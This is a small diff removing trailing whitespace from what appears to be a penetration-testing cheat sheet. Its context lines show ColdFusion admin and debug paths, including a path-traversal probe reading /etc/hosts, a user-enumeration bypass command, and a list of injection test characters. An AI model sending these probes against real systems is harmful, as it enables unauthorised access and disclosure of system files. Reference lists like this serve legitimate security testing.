@@ -41,7 +41,7 @@ https://target.com/level/x/exec/-/show
 
 # ColdFusion
 
-/CFIDE/administrator/ 
+/CFIDE/administrator/
 /CFIDE/debug/cf_debugFr.cfm
 /CFIDE/debug/cf_debugFr.cfm?userPage=../../etc/hosts
 /debug/cf_debugFr.cfm
@@ -362,7 +362,7 @@ stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
 Single quote        foo'
 Double quote        foo"
 Greater than        foo>
-Less than           foo<			
+Less than           foo<
 Comment tag         foo<!--
 Ampersand           &foo
 ------------------------------------------------------------------------------------------------------------------------------------------------------
